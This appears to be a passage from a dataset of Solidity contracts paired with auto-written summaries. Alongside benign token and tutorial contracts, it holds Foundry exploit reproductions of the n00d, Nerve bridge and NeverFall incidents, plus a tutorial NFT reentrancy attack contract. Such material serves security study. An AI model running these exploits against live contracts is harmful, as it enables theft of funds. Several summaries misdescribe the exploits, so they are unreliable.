        "code": "pragma solidity ^0.5.0;\n\ninterface Regulator {\n    function checkValue(uint amount) external returns (bool);\n    function loan() external returns (bool);\n}\n\ncontract Bank is Regulator {\n    uint private value;\n    \n    constructor(uint amount) public {\n        value = amount;\n    }\n    \n    function deposit(uint amount) public {\n        value += amount;\n    }\n    \n    function withdraw(uint amount) public {\n        if (checkValue(amount)) {\n            value -= amount;\n        }\n    }\n    \n    function balance() public view returns (uint) {\n        return value;\n    }\n    \n    function checkValue(uint amount) public returns (bool) {\n        // Classic mistake in the tutorial value should be above the amount\n        return value >= amount;\n    }\n    \n    function loan() public returns (bool) {\n        return value > 0;\n    }\n}\n\ncontract MyFirstContract is Bank(10) {\n    string private name;\n    uint private age;\n    \n    function setName(string memory newName) public {\n        name = newName;\n    }\n    \n    function getName() public view returns (string memory) {\n        return name;\n    }\n    \n    function setAge(uint newAge) public {\n        age = newAge;\n    }\n    \n    function getAge() public view returns (uint) {\n        return age;\n    }\n}\n",
        "summary": "This code defines two contracts: the first contract defines a Bank that implements a Regulator interface. The Bank contract has functions for depositing, withdrawing, checking the account balance, checking the value, and receiving loans. The second contract, called MyFirstContract, implements the Bank contract and adds two functions to set and get a name and age. The Bank contract is used to hold a value and can be used to handle deposits, withdrawals and loans. The MyFirstContract extends the Bank and adds name and age to it.",
        "id": "bcc8b5ba-a973-4c16-9fa0-4be9f7ac3f28"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\nimport \"browser/Token.sol\";\nimport \"browser/ERC20.sol\";\nimport \"browser/ERC223.sol\";\nimport \"browser/ERC223ReceivingContract.sol\";\n\ncontract MyFirstToken is Token(\"MFT\", \"My First Token\", 18, 1000), ERC20, ERC223 {\n\n    constructor() public {\n        _balanceOf[msg.sender] = _totalSupply;\n    }\n    \n    function totalSupply() public constant returns (uint) {\n        return _totalSupply;\n    }\n    \n    function balanceOf(address _addr) public constant returns (uint) {\n        return _balanceOf[_addr];\n    }\n\n    function transfer(address _to, uint _value) public returns (bool) {\n        if (_value > 0 && \n            _value <= _balanceOf[msg.sender] &&\n            !isContract(_to)) {\n            _balanceOf[msg.sender] -= _value;\n            _balanceOf[_to] += _value;\n            emit Transfer(msg.sender, _to, _value);\n            return true;\n        }\n        return false;\n    }\n\n    function transfer(address _to, uint _value, bytes _data) public returns (bool) {\n        if (_value > 0 && \n            _value <= _balanceOf[msg.sender] &&\n            isContract(_to)) {\n            _balanceOf[msg.sender] -= _value;\n            _balanceOf[_to] += _value;\n            ERC223ReceivingContract _contract = ERC223ReceivingContract(_to);\n                _contract.tokenFallback(msg.sender, _value, _data);\n            emit Transfer(msg.sender, _to, _value, _data);\n            return true;\n        }\n        return false;\n    }\n\n    function isContract(address _addr) public view returns (bool) {\n        uint codeSize;\n        assembly {\n            codeSize := extcodesize(_addr)\n        }\n        return codeSize > 0;\n    }\n\n    function transferFrom(address _from, address _to, uint _value) public returns (bool) {\n        if (_allowances[_from][msg.sender] > 0 &&\n            _value > 0 &&\n            _allowances[_from][msg.sender] >= _value &&\n            _balanceOf[_from] >= _value) {\n            _balanceOf[_from] -= _value;\n            _balanceOf[_to] += _value;\n            _allowances[_from][msg.sender] -= _value;\n            emit Transfer(_from, _to, _value);\n            return true;\n        }\n        return false;\n    }\n    \n    function approve(address _spender, uint _value) public returns (bool) {\n        _allowances[msg.sender][_spender] = _value;\n        emit Approval(msg.sender, _spender, _value);\n        return true;\n    }\n    \n    function allowance(address _owner, address _spender) public constant returns (uint) {\n        return _allowances[_owner][_spender];\n    }\n}\n",
        "summary": "This contract is the implementation of a token on the Ethereum blockchain. It uses the ERC20 standard and implements the ERC223 interface. The token has a name, symbol, and 18 decimal places. The initial supply of tokens is 1000 and assigned to the contract creator. The contract allows for transfer of tokens from one address to another, checking for available balance, approval from the owner, and allowance from other addresses. The contract also checks if the recipient address is a smart contract or not before transfer, and calls the appropriate function for the transfer in case of a smart contract.",
        "id": "4ee9e99e-53fe-4ce3-8b6a-f40f92b1b353"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\nimport \"browser/ERC20.sol\";\n\ncontract MyFirstToken is ERC20 {\n    string public constant symbol = \"MFT\";\n    string public constant name = \"My First Token\";\n    uint8 public constant decimals = 18;\n    \n    uint private constant __totalSupply = 1000;\n    mapping (address => uint) private __balanceOf;\n    mapping (address => mapping (address => uint)) private __allowances;\n    \n    constructor() public {\n            __balanceOf[msg.sender] = __totalSupply;\n    }\n    \n    function totalSupply() public constant returns (uint _totalSupply) {\n        _totalSupply = __totalSupply;\n    }\n    \n    function balanceOf(address _addr) public constant returns (uint balance) {\n        return __balanceOf[_addr];\n    }\n    \n    function transfer(address _to, uint _value) public returns (bool success) {\n        if (_value > 0 && _value <= balanceOf(msg.sender)) {\n            __balanceOf[msg.sender] -= _value;\n            __balanceOf[_to] += _value;\n            return true;\n        }\n        return false;\n    }\n    \n    function transferFrom(address _from, address _to, uint _value) public returns (bool success) {\n        if (__allowances[_from][msg.sender] > 0 &&\n            _value > 0 &&\n            __allowances[_from][msg.sender] >= _value && \n            __balanceOf[_from] >= _value) {\n            __balanceOf[_from] -= _value;\n            __balanceOf[_to] += _value;\n            // Missed from the video\n            __allowances[_from][msg.sender] -= _value;\n            return true;\n        }\n        return false;\n    }\n    \n    function approve(address _spender, uint _value) public returns (bool success) {\n        __allowances[msg.sender][_spender] = _value;\n        return true;\n    }\n    \n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\n        return __allowances[_owner][_spender];\n    }\n}\n",
        "summary": "This code defines a Solidity smart contract for a custom token called \"My First Token\". The token's information such as symbol, name, and decimals are defined. The contract implements the ERC20 interface which is a common standard for tokens on the Ethereum network. \n\nThe contract provides functions for checking the total supply, balances of account holders, and allowance given to account holders. It has functions for transferring tokens from one account to another and for allowing other accounts to transfer tokens. \n\nThe initial supply of the token is set to 1000 and the person who deploys the contract is given the full supply. The transferred amount can't exceed the balance of the sender. Finally, the contract can track the allowance given by an account holder to another account holder.",
        "id": "3f06ea9e-fb56-4970-985e-36f2fce9a32c"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// Analysis\n// https://twitter.com/BlockSecTeam/status/1584959295829180416\n// https://twitter.com/AnciliaInc/status/1584955717877784576\n// TX\n// https://etherscan.io/tx/0x8037b3dc0bf9d5d396c10506824096afb8125ea96ada011d35faa89fa3893aea\n\ninterface sushiBar {\n    function enter(uint256) external;\n    function leave(uint256) external;\n}\n\n\ncontract ContractTest is DSTest{\n    IERC777 n00d = IERC777(0x2321537fd8EF4644BacDCEec54E5F35bf44311fA);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x5476DB8B72337d44A6724277083b1a927c82a389);\n    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    IERC20 Xn00d = IERC20(0x3561081260186E69369E6C32F280836554292E08);\n    sushiBar Bar = sushiBar(0x3561081260186E69369E6C32F280836554292E08);\n    ERC1820Registry registry = ERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);\n    uint i;\n    uint enterAmount = 0;\n    uint n00dReserve;\n    \n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 15826379);\n    }\n\n    function testExploit() public{\n        registry.setInterfaceImplementer(address(this), bytes32(0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895), address(this));\n        n00d.approve(address(Bar), type(uint).max);\n        // The swap is performed 4 times.\n        int j;\n        for (j = 1; j < 5; j++) {\n            (n00dReserve, , ) = Pair.getReserves();\n            Pair.swap(n00dReserve - 1e18, 0, address(this), new bytes(1));\n        }\n        // Now all funds can be swapped back to WETH.\n        (n00dReserve, , ) = Pair.getReserves();\n        Pair.swap(n00dReserve - 1e18, 0, address(this), new bytes(1));\n        uint amountIn = n00d.balanceOf(address(this));\n        (uint n00dR, uint WETHR, ) = Pair.getReserves();\n        uint amountOut = amountIn * 997 * WETHR / (amountIn * 997 + n00dR * 1000);\n        n00d.transfer(address(Pair), amountIn);\n        Pair.swap(0, amountOut, address(this), \"\");\n\n        emit log_named_decimal_uint(\n            \"Attacker WETH profit after exploit\",\n            WETH.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public{\n        // Resetting count to 0 so we perform re-entry twice each time we swap/loan.\n        i = 0;\n        enterAmount = n00d.balanceOf(address(this)) / 5;\n        Bar.enter(enterAmount);\n        Bar.leave(Xn00d.balanceOf(address(this)));\n        n00d.transfer(address(Pair), n00dReserve * 1000 / 997 + 1000);\n    }\n\n    function tokensToSend(\n        address operator,\n        address from,\n        address to,\n        uint256 amount,\n        bytes calldata userData,\n        bytes calldata operatorData\n    ) external {\n        if(to == address(Bar) && i < 2){\n            i++;\n            Bar.enter(enterAmount);\n        }\n    }\n    \n\n    function tokensReceived(\n        address operator,\n        address from,\n        address to,\n        uint256 amount,\n        bytes calldata userData,\n        bytes calldata operatorData\n    ) external {}\n\n\n}",
        "summary": "This code is a Solidity smart contract that exploits a vulnerability in a Uniswap V2 pair smart contract. The contract joins a SushiSwap bar, swaps SUSHI tokens for NOODLE tokens, and repeatedly executes a swap to manipulate the reserves of the Uniswap V2 pair. The exploit allows the contract to receive more WETH tokens than it initially deposited, resulting in a profit. The contract also includes functions for handling token transfers and events for logging the attacker's profits.",
        "id": "0f26fda0-22ee-4141-aa83-3682bfd40b8d"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// tx: https://bscscan.com/tx/0xea95925eb0438e04d0d81dc270a99ca9fa18b94ca8c6e34272fc9e09266fcf1d\n// analysis: https://blocksecteam.medium.com/the-analysis-of-nerve-bridge-security-incident-ead361a21025\n\ninterface IFortube {\n    function flashloan(address receiver, address token, uint256 amount, bytes memory params) external;\n}\n\ninterface ISaddle {\n    function swap(\n        uint8 i,\n        uint8 j,\n        uint256 dx,\n        uint256 min_dy,\n        uint deadline\n    ) external returns (uint256);\n\n    function swapUnderlying(\n        uint8 tokenIndexFrom,\n        uint8 tokenIndexTo,\n        uint256 dx,\n        uint256 minDy,\n        uint256 deadline\n    ) external returns (uint256);\n}\n\ninterface ISwap {\n    function removeLiquidityOneToken(\n        uint256 tokenAmount,\n        uint8 tokenIndex,\n        uint256 minAmount,\n        uint256 deadline\n    ) external returns (uint256);\n}\n\n\ncontract ContractTest is Test {\n    uint256 mainnetFork;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    \n    IFortube flashloanProvider = IFortube(0x0cEA0832e9cdBb5D476040D58Ea07ecfbeBB7672);\n    address nerve3lp = 0xf2511b5E4FB0e5E2d123004b672BA14850478C14;\n    address busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;\n    address fusd = 0x049d68029688eAbF473097a2fC38ef61633A3C7A;\n    address fusdPool = 0x556ea0b4c06D043806859c9490072FaadC104b63;\n    address metaSwapPool = 0xd0fBF0A224563D5fFc8A57e4fdA6Ae080EbCf3D3;\n    address nerve3pool = 0x1B3771a66ee31180906972580adE9b81AFc5fCDc;\n\n    function setUp() public {\n        mainnetFork = vm.createFork(\"bsc\", 12653565);\n        vm.selectFork(mainnetFork);\n        cheats.label(address(flashloanProvider), \"flashloanProvider\");\n    }\n\n    function testExp() public {\n        // 1. flashloan 50000 busd from fortube\n        flashloanProvider.flashloan(address(this), busd, 50000 ether, \"0x\");\n        console.log(\"final busd profit: \", IERC20(busd).balanceOf(address(this)) / 10 ** IERC20(busd).decimals());\n    }\n\n    function executeOperation(address token, uint256 amount, uint256 fee, bytes calldata params) external {\n        IERC20(busd).approve(fusdPool, type(uint).max);\n        IERC20(fusd).approve(metaSwapPool, type(uint).max);\n        IERC20(nerve3lp).approve(nerve3pool, type(uint).max);\n        IERC20(busd).approve(metaSwapPool, type(uint).max);\n\n        // 2. swap from 50000 busd to fusd on Ellipsis   \n        IERC20(fusd).approve(fusdPool, type(uint).max);\n        IcurveYSwap(fusdPool).exchange_underlying(1, 0, IERC20(busd).balanceOf(address(this)), 1);\n        \n        for (uint8 i = 0; i < 7; i++) {\n            swap();\n        }\n\n        // 6. swap from fusd to busd on Ellipsis\n        IcurveYSwap(fusdPool).exchange_underlying(0, 1, IERC20(fusd).balanceOf(address(this)), 1);\n\n        // 7. payback flashloan\n        IERC20(busd).transfer(address(0xc78248D676DeBB4597e88071D3d889eCA70E5469), amount + fee);\n    }\n\n    function swap() public {\n        // 3. swap from fusd to Nerve 3-LP token on metaSwapPool\n        ISaddle(metaSwapPool).swap(0, 1, IERC20(fusd).balanceOf(address(this)), 1, block.timestamp);\n\n        // 4. remove liquidity Nerve.3pool with lp tokens to remove the liquidity of BUSD\n        ISwap(nerve3pool).removeLiquidityOneToken(IERC20(nerve3lp).balanceOf(address(this)), 0, 1, block.timestamp);\n\n        // 5. invoking the swapUnderlying function of MetaSwap to swap BUSD for fUSDT\n        ISaddle(metaSwapPool).swapUnderlying(1, 0, IERC20(busd).balanceOf(address(this)), 1, block.timestamp);\n    }\n}\n",
        "summary": "This is a smart contract written in Solidity for testing purposes. It includes several interfaces and addresses to interact with different tokens and platforms such as Fortube, Ellipsis, and Nerve. The code tests the swap function of the contract by swapping tokens between different platforms and simulating a flash loan from Fortube. The executeOperation function is called by the Fortube flashloan to initiate the token swaps. Overall, the code tests the functionality and interoperability of various DeFi platforms and tokens.",
        "id": "319eae64-05a4-4645-b311-3a1a6f6690c2"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\ncontract NestedArrays {\n\n    uint[][] private nested;\n\n    function getArray() public {\n        nested.push([1,2,3]);\n    }\n\n    // [1, 3, 2, 4]\n    function toBytes(uint[] _array)\n        public\n        returns (bytes _ptr) {\n        assembly {\n            let len := mload(_array)\n            _ptr := msize()\n            \n            // Bytes\n            mstore(_ptr, mul(add(len, 2), 0x20))\n            \n            // Array \n            mstore(add(_ptr, 0x20), 0x20)\n            mstore(add(_ptr, 0x40), len)\n            \n            let idx := 0\n            loop:\n            jumpi(end, eq(len, idx))\n            mstore(add(_ptr, add(mul(idx,0x20),0x60)), mload(add(_array, add(0x20, mul(idx, 0x20)))))\n            idx := add(idx, 1)\n            jump(loop)\n            \n            end:\n            // Without return statements memory is overridden\n            mstore(0x40, add(mul(len, 0x20), 0x20))\n        }\n    }\n    \n    // [\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x20\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x04\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x01\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x03\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x02\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x00\",\"0x04\"]\n    function toArray(bytes _bytes)\n        public\n        returns (uint[] _ptr) {\n        assembly {\n            \n            // First 32 bytes are byte array properties\n            // Next 32 bytes are the data size of the array elements\n            let len := mload(add(_bytes, 0x40))\n            _ptr := msize()\n            \n            // Array\n            mstore(_ptr, len)\n            \n            let idx := 0\n            loop:\n            jumpi(end, eq(len, idx))\n            mstore(add(_ptr, add(mul(idx,0x20),0x20)), mload(add(_bytes, add(0x60, mul(idx, 0x20)))))\n            idx := add(idx, 1)\n            jump(loop)\n            \n            end:\n            mstore(0x40, add(_ptr,add(mul(len, 0x20), 0x40)))\n        }\n    }\n  \n}",
        "summary": "This code defines a contract called NestedArrays which contains two functions that convert between arrays of uints and bytes. \n\nThe function `getArray()` adds a uint array to the private nested array. \n\nThe function `toBytes(uint[] _array)` takes in a uint array and converts it into a bytes array. It uses assembly code to loop through the uint array and store the values as bytes.\n\nThe function `toArray(bytes _bytes)` takes in a bytes array and converts it into a uint array. It uses assembly code to loop through the bytes array and store the values as uints.",
        "id": "e307809e-cbcc-4bb2-84de-cae5c2b3616b"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\n@Analysis\nhttps://twitter.com/BeosinAlert/status/1653619782317662211\n@TX\nhttps://bscscan.com/tx/0xccf513fa8a8ed762487a0dcfa54aa65c74285de1bc517bd68dbafa2813e4b7cb\n*/\n\ninterface INeverFall {\n    function buy(uint256 amountU) external returns(uint256);\n    function sell(uint256 amount) external returns(uint256);\n}\n\ncontract ContractTest is Test {\n\n    address neverFall = 0x5ABDe8B434133C98c36F4B21476791D95D888bF5;\n    address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n    address creator = 0x051d6a5f987e4fc53B458eC4f88A104356E6995a;\n    address busd_usdt_pool = 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00;\n    address usdt = 0x55d398326f99059fF775485246999027B3197955;\n    address payable pancakeRouter = payable(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n\n    function setUp() public {\n        vm.createSelectFork(\"bsc\", 27863178 - 1);\n    }\n\n    function testExploit() public {\n        uint256 flashLoanAmount = 1600000 * 1e18;\n        IUniswapV2Pair(busd_usdt_pool).swap(flashLoanAmount, 0, address(this), new bytes(1));\n    }\n\n    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {\n        uint256 usdtBalance = IERC20(usdt).balanceOf(address(this));\n        IERC20(usdt).approve(neverFall, type(uint256).max);\n        IERC20(usdt).approve(router, type(uint256).max);\n        // buy neverfall\n        INeverFall(neverFall).buy(200000 * 1e18);\n        bscSwap(usdt, neverFall, 1400000 * 1e18);\n        // sell neverfall\n        INeverFall(neverFall).sell(75500000 * 1e18);\n\n        IERC20(usdt).transfer(msg.sender, usdtBalance  + usdtBalance * 30 / 10000);\n        emit log_named_decimal_uint(\"[After Attacks]  Attacker usdt balance\", IERC20(usdt).balanceOf(address(this)), 18);\n    }\n\n\n    function bscSwap(address tokenFrom, address tokenTo, uint256 amount) internal {\n        IERC20(tokenFrom).approve(pancakeRouter, type(uint).max);\n        address[] memory path = new address[](2);\n        path[0] = tokenFrom;\n        path[1] = tokenTo;\n        IUniswapV2Router(pancakeRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, creator, block.timestamp);\n    }\n}\n",
        "summary": "This is Solidity code that defines a test contract. The contract imports two other contracts: \"Test.sol\" and \"./interface.sol\". It defines an interface for a smart contract called \"INeverFall\" and includes several addresses for various contracts. \n\nThe \"testExploit()\" function is called by external code and initiates an attack on the \"IUniswapV2Pair\" contract. The \"pancakeCall()\" function receives the return value from the attack and performs several operations using the \"INeverFall\" smart contract, as well as other transfers and approvals. The \"bscSwap()\" function performs a token swap on a Uniswap-like exchange. Finally, the contract emits a log of the attacker's USDT balance after the attack and transfers some USDT back to the attacker. \n\nOverall, this code appears to be simulating an attack on a DeFi protocol and demonstrating the impact of such an attack.",
        "id": "ec4457c5-db4d-4be4-b0b8-75d9b7fe26ef"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// By 0xAA\npragma solidity ^0.8.4;\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\n\n// NFT contract with Reentrancy Vulnerability\ncontract NFTReentrancy is ERC721 {\n    uint256 public totalSupply;\n    mapping(address => bool) public mintedAddress;\n    // \u6784\u9020\u51fd\u6570\uff0c\u521d\u59cb\u5316NFT\u5408\u96c6\u7684\u540d\u79f0\u3001\u4ee3\u53f7\n    constructor() ERC721(\"Reentry NFT\", \"ReNFT\"){}\n\n    // \u94f8\u9020\u51fd\u6570\uff0c\u6bcf\u4e2a\u7528\u6237\u53ea\u80fd\u94f8\u90201\u4e2aNFT\n    // \u6709\u91cd\u5165\u6f0f\u6d1e\n    function mint() payable external {\n        // \u68c0\u67e5\u662f\u5426mint\u8fc7\n        require(mintedAddress[msg.sender] == false);\n        // \u589e\u52a0total supply\n        totalSupply++;\n        // mint\n        _safeMint(msg.sender, totalSupply);\n        // \u8bb0\u5f55mint\u8fc7\u7684\u5730\u5740\n        mintedAddress[msg.sender] = true;\n    }\n}\n\ncontract Attack is IERC721Receiver{\n    NFTReentrancy public nft; // Bank\u5408\u7ea6\u5730\u5740\n\n    // \u521d\u59cb\u5316NFT\u5408\u7ea6\u5730\u5740\n    constructor(NFTReentrancy _nftAddr) {\n        nft = _nftAddr;\n    }\n    \n    // \u653b\u51fb\u51fd\u6570\uff0c\u53d1\u8d77\u653b\u51fb\n    function attack() external {\n        nft.mint();\n    }\n\n    // ERC721\u7684\u56de\u8c03\u51fd\u6570\uff0c\u4f1a\u91cd\u590d\u8c03\u7528mint\u51fd\u6570\uff0c\u94f8\u902010\u4e2a\n    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {\n        if(nft.balanceOf(address(this)) < 10){\n            nft.mint();\n        }\n        return this.onERC721Received.selector;\n    }\n}\n",
        "summary": "This code defines two Solidity contracts, where one contract `NFTReentrancy` is an ERC721 token contract with a reentrancy vulnerability and another contract `Attack` defines a function to exploit the vulnerability. The `NFTReentrancy` contract allows one NFT per user to be minted. The `Attack` contract contains a function that repeatedly calls the `mint` function in `NFTReentrancy` using the `onERC721Received` callback function, causing the `NFTReentrancy` contract to mint more than one token per user, exploiting the reentrancy vulnerability.",
        "id": "18b73d33-4eaf-46fc-abda-aecd90fb1a50"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport \"../34_ERC721/IERC721.sol\";\nimport \"../34_ERC721/IERC721Receiver.sol\";\nimport \"../34_ERC721/WTFApe.sol\";\n\ncontract NFTSwap is IERC721Receiver {\n    event List(\n        address indexed seller,\n        address indexed nftAddr,\n        uint256 indexed tokenId,\n        uint256 price\n    );\n    event Purchase(\n        address indexed buyer,\n        address indexed nftAddr,\n        uint256 indexed tokenId,\n        uint256 price\n    );\n    event Revoke(\n        address indexed seller,\n        address indexed nftAddr,\n        uint256 indexed tokenId\n    );\n    event Update(\n        address indexed seller,\n        address indexed nftAddr,\n        uint256 indexed tokenId,\n        uint256 newPrice\n    );\n\n    // \u5b9a\u4e49order\u7ed3\u6784\u4f53\n    struct Order {\n        address owner;\n        uint256 price;\n    }\n    // NFT Order\u6620\u5c04\n    mapping(address => mapping(uint256 => Order)) public nftList;\n\n    fallback() external payable {}\n\n    // \u6302\u5355: \u5356\u5bb6\u4e0a\u67b6NFT\uff0c\u5408\u7ea6\u5730\u5740\u4e3a_nftAddr\uff0ctokenId\u4e3a_tokenId\uff0c\u4ef7\u683c_price\u4e3a\u4ee5\u592a\u574a\uff08\u5355\u4f4d\u662fwei\uff09\n    function list(address _nftAddr, uint256 _tokenId, uint256 _price) public {\n        IERC721 _nft = IERC721(_nftAddr); // \u58f0\u660eIERC721\u63a5\u53e3\u5408\u7ea6\u53d8\u91cf\n        require(_nft.getApproved(_tokenId) == address(this), \"Need Approval\"); // \u5408\u7ea6\u5f97\u5230\u6388\u6743\n        require(_price > 0); // \u4ef7\u683c\u5927\u4e8e0\n\n        Order storage _order = nftList[_nftAddr][_tokenId]; //\u8bbe\u7f6eNF\u6301\u6709\u4eba\u548c\u4ef7\u683c\n        _order.owner = msg.sender;\n        _order.price = _price;\n        // \u5c06NFT\u8f6c\u8d26\u5230\u5408\u7ea6\n        _nft.safeTransferFrom(msg.sender, address(this), _tokenId);\n\n        // \u91ca\u653eList\u4e8b\u4ef6\n        emit List(msg.sender, _nftAddr, _tokenId, _price);\n    }\n\n    // \u8d2d\u4e70: \u4e70\u5bb6\u8d2d\u4e70NFT\uff0c\u5408\u7ea6\u4e3a_nftAddr\uff0ctokenId\u4e3a_tokenId\uff0c\u8c03\u7528\u51fd\u6570\u65f6\u8981\u9644\u5e26ETH\n    function purchase(address _nftAddr, uint256 _tokenId) public payable {\n        Order storage _order = nftList[_nftAddr][_tokenId]; // \u53d6\u5f97Order\n        require(_order.price > 0, \"Invalid Price\"); // NFT\u4ef7\u683c\u5927\u4e8e0\n        require(msg.value >= _order.price, \"Increase price\"); // \u8d2d\u4e70\u4ef7\u683c\u5927\u4e8e\u6807\u4ef7\n        // \u58f0\u660eIERC721\u63a5\u53e3\u5408\u7ea6\u53d8\u91cf\n        IERC721 _nft = IERC721(_nftAddr);\n        require(_nft.ownerOf(_tokenId) == address(this), \"Invalid Order\"); // NFT\u5728\u5408\u7ea6\u4e2d\n\n        // \u5c06NFT\u8f6c\u7ed9\u4e70\u5bb6\n        _nft.safeTransferFrom(address(this), msg.sender, _tokenId);\n        // \u5c06ETH\u8f6c\u7ed9\u5356\u5bb6\uff0c\u591a\u4f59ETH\u7ed9\u4e70\u5bb6\u9000\u6b3e\n        payable(_order.owner).transfer(_order.price);\n        payable(msg.sender).transfer(msg.value - _order.price);\n\n        delete nftList[_nftAddr][_tokenId]; // \u5220\u9664order\n\n        // \u91ca\u653ePurchase\u4e8b\u4ef6\n        emit Purchase(msg.sender, _nftAddr, _tokenId, _order.price);\n    }\n\n    // \u64a4\u5355\uff1a \u5356\u5bb6\u53d6\u6d88\u6302\u5355\n    function revoke(address _nftAddr, uint256 _tokenId) public {\n        Order storage _order = nftList[_nftAddr][_tokenId]; // \u53d6\u5f97Order\n        require(_order.owner == msg.sender, \"Not Owner\"); // \u5fc5\u987b\u7531\u6301\u6709\u4eba\u53d1\u8d77\n        // \u58f0\u660eIERC721\u63a5\u53e3\u5408\u7ea6\u53d8\u91cf\n        IERC721 _nft = IERC721(_nftAddr);\n        require(_nft.ownerOf(_tokenId) == address(this), \"Invalid Order\"); // NFT\u5728\u5408\u7ea6\u4e2d\n\n        // \u5c06NFT\u8f6c\u7ed9\u5356\u5bb6\n        _nft.safeTransferFrom(address(this), msg.sender, _tokenId);\n        delete nftList[_nftAddr][_tokenId]; // \u5220\u9664order\n\n        // \u91ca\u653eRevoke\u4e8b\u4ef6\n        emit Revoke(msg.sender, _nftAddr, _tokenId);\n    }\n\n    // \u8c03\u6574\u4ef7\u683c: \u5356\u5bb6\u8c03\u6574\u6302\u5355\u4ef7\u683c\n    function update(\n        address _nftAddr,\n        uint256 _tokenId,\n        uint256 _newPrice\n    ) public {\n        require(_newPrice > 0, \"Invalid Price\"); // NFT\u4ef7\u683c\u5927\u4e8e0\n        Order storage _order = nftList[_nftAddr][_tokenId]; // \u53d6\u5f97Order\n        require(_order.owner == msg.sender, \"Not Owner\"); // \u5fc5\u987b\u7531\u6301\u6709\u4eba\u53d1\u8d77\n        // \u58f0\u660eIERC721\u63a5\u53e3\u5408\u7ea6\u53d8\u91cf\n        IERC721 _nft = IERC721(_nftAddr);\n        require(_nft.ownerOf(_tokenId) == address(this), \"Invalid Order\"); // NFT\u5728\u5408\u7ea6\u4e2d\n\n        // \u8c03\u6574NFT\u4ef7\u683c\n        _order.price = _newPrice;\n\n        // \u91ca\u653eUpdate\u4e8b\u4ef6\n        emit Update(msg.sender, _nftAddr, _tokenId, _newPrice);\n    }\n\n    // \u5b9e\u73b0{IERC721Receiver}\u7684onERC721Received\uff0c\u80fd\u591f\u63a5\u6536ERC721\u4ee3\u5e01\n    function onERC721Received(\n        address operator,\n        address from,\n        uint tokenId,\n        bytes calldata data\n    ) external override returns (bytes4) {\n        return IERC721Receiver.onERC721Received.selector;\n    }\n}\n",
